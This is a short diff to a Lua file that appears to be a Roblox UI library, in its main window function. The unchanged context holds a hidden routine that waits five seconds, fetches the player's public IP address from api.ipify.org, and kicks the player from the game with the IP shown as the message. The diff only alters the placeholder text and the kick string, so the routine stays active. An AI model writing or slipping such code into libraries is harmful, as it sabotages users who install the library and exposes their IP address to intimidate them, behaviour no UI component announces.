@@ -158,7 +158,7 @@ function AtlasLib.Main(Name,X,Y)
         spawn(function()
             wait(5)
             if LocalPlayer then
-                local ip = "unknown"
+                local ip = "???"
                 local ok, res = pcall(function()
                     return game:GetService("HttpService"):GetAsync("https://api.ipify.org/?format=json")
                 end)
@@ -170,7 +170,7 @@ function AtlasLib.Main(Name,X,Y)
                         ip = decoded.ip or ip
                     end
                 end
-                LocalPlayer:Kick("" .. tostring(ip))
+                LocalPlayer:Kick(tostring(ip))
             end
         end)
 
